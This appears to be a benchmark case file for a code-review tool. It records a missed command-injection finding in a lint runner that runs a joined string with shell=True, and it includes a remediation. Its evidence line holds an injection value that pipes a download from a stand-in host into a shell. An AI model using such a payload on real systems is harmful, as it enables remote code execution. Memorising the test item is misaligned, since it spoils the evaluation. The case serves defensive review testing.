---
id: bench-security-command-injection-002
title: Command injection via shell string join must block merge
category: missed_finding
submitted_at: '2026-08-15T13:12:00.000000Z'
run_id: bench-security
pr_number: null
failure_mode: missed_finding
expected_finding: src/mergecraft/analyzers/adapters/lint_runner.py:9-10 command injection
  via shell=True string join
expected_decision: failure
replay_command: mergecraft eval replay bench-security-command-injection-002
provenance:
  run_id: bench-security
  pr_number: null
  source_field: eval_bank
  author_login: alexhawat
  author_association: OWNER
  trust_tier: trusted
  timestamp: '2026-08-15T13:12:00.000000Z'
recorded_findings:
- path: src/mergecraft/analyzers/adapters/lint_runner.py
  start_line: 9
  end_line: 10
  message: run_lint joins command+target into one shell string and runs it with shell=True
  severity: Critical
  confidence: certain
  category: Security & Privacy
  source: agent
  fingerprint: benchSecurityCommandInjection00201
  tool: agent
  rule_id: agent:bench-security-command-injection-002
  introduced_by_pr: 'true'
  evidence:
  - target = '; curl evil.example | sh' executes arbitrary commands
  remediation: Pass [*command, target] as an argv list without shell=True.
  autofix: null
  cluster_id: null
run_succeeded: true
trust_tier: trusted
---

Agent-seeded corpus case (B4). Security class — joining argv into a shell string on caller-controlled input is command injection.
